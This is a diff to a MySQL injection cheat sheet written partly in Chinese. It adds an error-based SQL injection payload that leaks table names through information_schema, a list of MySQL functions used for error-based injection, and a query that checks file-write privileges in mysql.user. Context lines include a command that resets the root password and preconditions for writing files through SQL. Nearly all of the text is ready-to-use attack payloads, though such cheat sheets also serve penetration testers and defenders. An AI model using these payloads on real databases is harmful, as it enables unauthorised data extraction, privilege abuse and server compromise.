@@ -40,8 +40,21 @@ MySQL Payload
     - ``ascii(substring(str,pos,length)) & 32 = 1``
 - Error Based
     - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
+    - ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
 - Change Password
     - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
+
+报错注入常见函数
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- extractvalue
+- updatexml
+- GeometryCollection
+- linestring
+- multilinestring
+- multipoint
+- multipolygon
+- polygon
+- exp
 
 写文件
 ----------------------------------------
@@ -52,6 +65,7 @@ MySQL Payload
 - 知晓文件绝对路径
 - 写入的路径存在写入权限
 - secure_file_priv 允许向对应位置写入
+- ``select count(file_priv) from mysql.user``
 
 基于 into 写文件
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
